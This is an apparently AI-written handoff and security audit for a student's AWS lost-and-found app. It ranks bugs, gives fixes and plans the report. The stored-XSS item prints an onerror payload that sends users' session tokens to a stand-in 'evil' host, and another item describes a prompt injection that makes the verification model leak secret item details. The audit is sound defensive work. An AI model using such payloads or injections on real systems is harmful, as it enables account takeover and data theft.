# Findr — Full Handoff & Audit

**Student:** Mohammed Hannan Noor, XXXXXXXX, PC02, tutor Lee Jin
**Module:** CTAI / CAI2C09 Cloud Technologies for AI, AY2026/27 April sem
**Site:** https://d3d5h347656j6.cloudfront.net
**Region:** ap-southeast-2 (Sydney)
**Local files:** `C:\Users\noorh\Downloads\XXXXXXXX_Hannan Noor (1)\XXXXXXXX_Hannan Noor\findr\`

---

## 0. STATUS

| Item | Due | State |
|---|---|---|
| Code zip | Fri 14 Aug 1700 | ✅ **DONE** — `XXXXXXXX_MohammedHannanNoor.zip` sits next to the `findr` folder |
| Report (.docx, 20%) | Mon 17 Aug 0900 | ❌ Not started — you said Saturday |
| Slides + 5-min video (10%) | Mon 17 Aug 0900 | ❌ Not started |
| Page screenshots | for report | ❌ Deferred to weekend |
| Mobile check | grading criterion | ❌ Not done |

**⚠️ Stop the Rekognition Custom Labels model when not testing — ~$4/hour.**

---

## 1. ARCHITECTURE (for the report)

**Browser** → CloudFront (OAC, HTTPS redirect, WAF) → S3 static site (private)
**Browser** → API Gateway REST (`gc6g5y25da`, stage `prod`) → Lambda → DynamoDB / S3 / Rekognition / Bedrock / Translate / SNS
**Auth:** Cognito user pool, ID token (JWT) in `Authorization` header, Cognito authorizer on API Gateway
**Maps:** Amazon Location Service v2 + MapLibre GL JS (browser → AWS directly, API key)

**Services used:** S3, CloudFront, WAF, API Gateway, Lambda, DynamoDB, Cognito, SNS, Rekognition (incl. **Custom Labels, F1 0.93**), Bedrock (Nova Lite), Translate, Comprehend, CloudWatch, Location Service, IAM.
**Taught in class:** CloudFront, CloudWatch, DynamoDB, S3, Lambda, API Gateway, Rekognition. **Everything else is the "not taught" requirement — you have 7.**

**Lambdas:** `findr-reports` (CRUD), `findr-images` (presign + Rekognition), `findr-messages`, `findr-verify` (Bedrock ownership Qs), `findr-match` (Bedrock semantic match), `findr-translate`. (`findr-presignup` trigger was removed.)

**Tables:** `findr-reports` (PK `reportId`, GSI `type-createdAt-index`), `findr-messages`. (`findr-users` deleted — Cognito owns user data.)

---

## 2. AUDIT RESULTS

Five parallel audits ran over the live code. Findings deduped and ranked.
**Nothing below is currently fixed.** Everything is as-deployed.

### 🔴 P0 — fix before the marker touches it

**A. Editing a found report WIPES its verification details.** *(found independently by 3 audits)*
`GET /reports` has **no authorizer**, so `get_user()` returns `None`, so `is_owner` is never true, so the owner never gets their own `secretDetails` back. The edit modal renders 3 blank boxes, and on save `my-reports.js:193-197` unconditionally sends `secretDetails: []`, which `findr-reports.py:316-319` writes. The private facts are destroyed permanently and the Claim button disappears forever for that item.
**Trigger:** edit any found report. Every time.
**Fix (1 line, backend):** `findr-reports.py:316` → change `if "secretDetails" in body:` to `if body.get("secretDetails"):`
**Proper fix:** put the Cognito authorizer on `GET /reports` and `GET /reports/{id}` — also fixes B.

**B. Every user's email is public.** `decorate()` (`findr-reports.py:104-106`) strips `secretDetails` but **not** `userEmail`, `verification`, or `lastClaimAttempt`. `GET /reports` is unauthenticated.
`curl https://gc6g5y25da.execute-api.ap-southeast-2.amazonaws.com/prod/reports` with no account returns every reporter's email address, plus who attempted to claim what and the AI's verdict on them.
**Fix:** in `decorate()` add `item.pop("userEmail", None)` and only keep `verification`/`lastClaimAttempt` when `is_owner or user["isAdmin"]`.

**C. `POST /verify/start` may not exist in API Gateway.** The build guide created `/verify/upload-url`, `/verify/face`, `/verify/questions`, `/verify/answers` — **never `/verify/start`**. If it's missing, the whole claim wizard dies at step 1 with a 403.
**Check:** API Gateway → Resources → is there a `/verify/start`? If not: create it → POST → `findr-verify` → **tick Lambda proxy integration** → authorizer `findr-cognito-auth` → enable CORS → Deploy to `prod`.
*(You already hit the un-ticked proxy checkbox on `DELETE /reports/{id}` — worth re-checking that box on **every** method while you're in there.)*

**D. Stored XSS → session theft → admin takeover.** No HTML-escaping helper exists anywhere in the frontend. Unescaped sinks: `api.js:731-733` (report cards), `item-details.js:90,93,100,113`, `messages.js:139,96-98,117-118`, `admin.js:92-95`.
A report titled `<img src=x onerror="fetch('https://evil/?d='+localStorage.findr_session)">` steals the `idToken` **and** `accessToken` of everyone who loads Browse or Home — including the first admin who opens the dashboard.
**Fix (~15 min):** add to `api.js` and wrap every server-data interpolation in the sinks above:
```js
const esc = s => String(s ?? '').replace(/[&<>"']/g, c =>
  ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
```
**This is the single best thing you can do for the Cloud Security row** — and a great paragraph in the report.

**E. Registration dead-ends.** You removed the `findr-presignup` trigger (good), but check the flow end-to-end: if any auto-confirm remains, `ConfirmSignUp` on an already-confirmed user throws `NotAuthorizedException`, which `friendlyAuthError` mistranslates to **"Incorrect email or password."** on the verification screen. Register a fresh account and confirm the code actually arrives and works.

### 🟠 P1 — cheap, visible, worth marks

| # | File:line | Problem | Fix |
|---|---|---|---|
| F | `register.html:50` | Says "At least 6 characters", `minlength="6"`, but Cognito needs 8 + number + capital + symbol. Users get rejected after being told they're fine. | Match the wording used on `forgot-password.html:54` |
| G | `js/my-reports.js:3` | Live comment: `TODO part 2: scope by the signed in cognito user and persist via api gateway` — **the work is done.** A marker reading source sees an unfinished project. | Delete it |
| H | `js/register.js:1` | `/* Part 1: cosmetic, no session */` — it does real Cognito signup | Delete/reword |
| I | `js/report.js:161,181` | `// simulated Rekognition` — it isn't simulated any more | Reword |
| J | `map.html:45,72` | Copy says click "bubbles"/"Group — click to zoom". Clustering was removed; there are no bubbles. | Delete those two bits of copy |
| K | `account.html:42` | `class="crumbs"` has no CSS → breadcrumb renders as raw blue underlined links on the dark hero. Visible on load. | Change to `class="breadcrumb"` |
| L | `account.html:30` | Navbar highlights "My Reports" while you're on Account | Move `class="active"` |
| M | `js/login.js:44,118` | `?next=` is written by `api.js:73` but never read → logged-out click on My Reports dumps you on Home after login | `const n=new URLSearchParams(location.search).get("next"); location.href = n \|\| "index.html";` |
| N | `js/map.js:123,156` | Error text tells the user to edit `js/map.js`; the key is in `js/api.js:16` | Fix the string |
| O | `js/messages.js:118` | Hardcoded `Active now` + green online dot for everyone. Nothing tracks presence. | Remove — it's fake data in a live app |
| P | `index.html:56-67` | Hero collage has 3 hardcoded fake reports (Blue Water Bottle / AirPods / Black Wallet) | Decorative + `aria-hidden`, but it's Part-1 residue |
| Q | `js/report.js:37-67` | `runMatch()` plays a fake 1.2s progress bar with canned messages *before* the real `/match` call | Cosmetic theatre — your call |
| R | Footers | "Explore" column has 2 versions; Campus Map appears in only 3 of 10 footers | Pick one |

### 🟡 P2 — mobile (graded: "responsive across devices")

1. **Mobile menu is broken.** `styles.css:1027-1031` — `.navbar-links` and `.navbar-auth` get identical absolute coords and both open on the same tap, so the white Log In/Sign Up box paints over Home and Browse. `.navbar .container` also lacks `position: relative`, so the panel goes edge-to-edge. **This is the marker's first tap on a phone.**
2. **Every input triggers iOS zoom.** `styles.css:509` is `0.95rem` = 15.2px; Safari auto-zooms anything under 16px and leaves the page zoomed. One-line fix: `font-size: 1rem`.
3. **Messages: tapping a conversation looks dead on mobile.** Panes stack but `min-height:520px` (`styles.css:897`) isn't reset and nothing scrolls the chat into view. Add `scrollIntoView` in `messages.js` `openConversation`.
4. `admin.html:150-158` — 3-button row needs ~363px in a ~309px modal → overflows. Add `.d-flex { flex-wrap: wrap }`.
5. Toasts (`styles.css:973`) sit at top-right over the hamburger, no max-width. Move to bottom on mobile.
6. Map legend clipped at 375px (`styles.css:1077`).
7. No loading states on browse / my-reports / admin — blank screen while data loads. A `.spinner` class already exists at `styles.css:549`.
8. No `autocomplete` on any email/password field (cheap accessibility marks).
9. `messages.html:71` (send) and `admin.html:116` (close) are icon-only with no `aria-label` — every other icon button in the app has one.

### 🟢 P3 — mention in the report, don't necessarily fix

- **Prompt injection in `/verify/answers`** (`findr-verify.py:211-241`): `questions` comes from the request body and is interpolated into the same prompt as the secret facts, and `notes` is returned to the caller. A crafted `questions` value can make Nova Lite echo the secrets. Fix = regenerate questions server-side. **Excellent report material even unfixed** — "a known limitation I identified".
- **Unlimited claim attempts + exact confidence score returned** (`findr-verify.py:269,322`) = a guessing oracle. Cap at 3 attempts, return pass/fail only.
- **Admin check is a substring match** (`findr-reports.py:71`): `"admin" in claims.get("cognito:groups","")` also matches `badminton`, `non-admin`. Not exploitable today (only `admin` exists) but one group away from privilege escalation.
- **Photoless reports all match each other at 100%** (`report.js:263`): sends placeholder labels `["Item","Object"]`, so Jaccard = 1.0. Send `[]` instead and the existing guard returns 0.
- **No DynamoDB pagination** anywhere (1MB page cap). Fine at demo scale.
- **`POST /translate` is unauthenticated** — a free translation API for anyone who finds the URL.
- **IAM:** `findr-users` table ARN is still granted (`findr-lambda-policy.json:20`) but the table is deleted — remove it. Bedrock/Rekognition/Translate use `Resource:"*"` (Rekognition and Translate have no resource ARNs, so that's unavoidable; Bedrock could be scoped).
- **Location Service API key has no client restriction** — anyone can lift it from `api.js` and bill map tiles to your account. Set the restriction to your CloudFront domain.
- `js/api.js` still exposes `DEMO_USER` as a global name (works fine, Part-1 naming).
- ~200 lines of dead CSS for removed features (Leaflet, face viewfinder `.vz-frame.face`, `.vz-checks`, `.auth-demo`, cluster styles).

### ✅ Verified CLEAN (say so in the report — these are your strengths)

- `secretDetails` correctly stripped on all four CRUD read paths; `decorate()` is a genuine single-chokepoint design
- Ownership enforced server-side on edit **and** delete, with an `editable` allow-list preventing `userId` reassignment — **no IDOR**
- Conversation reads properly authorised (`findr-messages.py:141`); audit actively tried to construct a bypass and couldn't
- **No Lambda reads identity from the request body** — all from JWT claims
- S3: both buckets private, 5-min presigned PUTs with content-type allow-listing, 1-hour presigned GETs, IAM scoped to `uploads/*`
- All frontend/backend response shapes match field-for-field (audited exhaustively)
- Script load order correct on all 14 pages; every `onclick` target resolves; all 17 JS files pass `node --check`
- Navbar identical across all 10 pages; Admin link injected only for admins; **no Admin link in any footer**
- No orphaned pages; every local `href`/`src` resolves
- Verification copy is accurate everywhere — no page claims face/ID checks
- Viewport meta on all 14 pages; tables wrapped in `overflow-x:auto`; modals scroll correctly
- Cognito client ID, API URL, and Location key in client JS are all safe to expose by design

---

## 3. YOUR CHAT-DELETION QUESTION — answered

**Deleting a report does NOT break the chat, which is the correct behaviour.**
`findr-reports.py` `delete()` removes the row from `findr-reports` and the photo from S3 — it never touches `findr-messages`. Conversations live under their own `conversationId`, and `reportTitle` is **copied onto each message at send time**, so threads keep rendering the right item name. Only the "View item" link 404s into the existing "Report not found" state.
*(Worth a sentence in the report: message history is deliberately denormalised so conversations survive item deletion.)*

---

## 4. THINGS ALREADY EXPLAINED — reuse verbatim in the report

**JWT (you already implemented it):** three dot-separated parts, `header.payload.signature`. Payload is base64 JSON — readable by anyone, **not encrypted**. Cognito signs it; anyone can verify with Cognito's public key. So it's readable by all, forgeable by none. API Gateway validates the signature *before Lambda runs*, so a bad token costs zero invocations. The Lambda then reads `sub` and `cognito:groups` from the claims.
> *"Authentication uses JWTs issued by Cognito. API Gateway validates the signature before invoking Lambda, and the Lambda derives user identity and role from the token's claims rather than from client-supplied data, so a user cannot impersonate another account or self-promote to admin."*

**Why the API is POST-heavy** (full table in `guides/PART_G`): `/reports` is a **resource** → full GET/POST/PUT/DELETE = your CRUD. Everything else is an **operation**, not a noun. GET must be safe, idempotent and cacheable, and has no body — none of which holds for "run Bedrock" or "write a claim record". Plus query strings get logged in browser history, CloudWatch and proxies; ownership answers have no business in a URL.

**Platform limitation you hit:** conversation IDs contain `#`, and API Gateway 403s on `%23` inside a path parameter — hence `GET /messages?conversationId=...` instead of `/messages/{id}`. Concrete, real, good report material.

**Lambda proxy integration:** if unticked, the whole `{statusCode, headers, body}` dict arrives as the response body, so `data.success` is `undefined` and toasts print "undefined". This bit you on `DELETE /reports/{id}`. **Check the box on every method.**

---

## 5. GUIDES ON DISK

`/home/claude/findr-aws/guides/` — Parts A–H (setup, Lambda/API, frontend, Rekognition training, Location Service, verification, admin+rubric, MFA). These are the raw material for the report's "setup guide for all services" criterion. **Part G contains the full rubric check and REST verb table.**

MFA was abandoned by choice — Cognito requires SES for email MFA. The code in `api.js`/`login.js` handles MFA challenges but lies dormant since the pool never issues one. Harmless. `guides/PART_H` documents the SES route if you ever want it.

---

## 6. RECOMMENDED ORDER FOR SATURDAY

1. **20 min:** P0 items A, B, C — three small backend edits + one API Gateway check. These are correctness *and* security marks.
2. **15 min:** P0 item D (the `esc()` helper). Biggest security win available.
3. **20 min:** P1 rows F, G, H, I, J, K, L — copy and comment fixes a marker will literally read.
4. **20 min:** P2 items 1 and 2 (mobile menu + input font-size). These two alone rescue the "responsive across devices" row.
5. Re-upload to S3, **CloudFront invalidate `/*`**, rebuild the zip.
6. Screenshots (13 pages), architecture diagram.
7. **Report, slides, video — 30% of the subject, still at zero.**

Do not add features.
